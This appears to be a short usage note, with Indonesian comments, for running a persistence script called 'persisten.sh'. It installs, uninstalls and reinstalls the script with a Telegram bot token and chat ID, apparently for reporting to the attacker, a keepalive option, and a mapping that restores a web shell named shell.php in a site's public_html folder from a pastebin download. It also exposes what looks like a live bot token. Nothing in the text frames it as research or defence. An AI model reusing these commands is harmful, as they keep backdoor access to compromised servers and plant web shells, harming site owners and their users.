GS_TG_TOKEN="8161674507:AAHCnkH1j4Y1DIwy0Yh_NV6bD8E2hiJ1pes" \
GS_TG_CHATID="-1003581261740" \
GS_KEEPALIVE=1 \
GS_WEBSHELL_MAP="/home/user/public_html/shell.php:https://pastebin.cz/raw/xxx" \
bash persisten.sh


# Uninstall dulu
GS_UNDO=1 bash persisten.sh

# Install ulang (akan generate secret baru)
GS_TG_TOKEN="8161674507:AAHCnkH1j4Y1DIwy0Yh_NV6bD8E2hiJ1pes" \
GS_TG_CHATID="-1003581261740" \
GS_KEEPALIVE=1 \
GS_WEBSHELL_MAP="/home/user/public_html/shell.php:https://pastebin.cz/raw/pxxEihU" \
bash persisten.sh
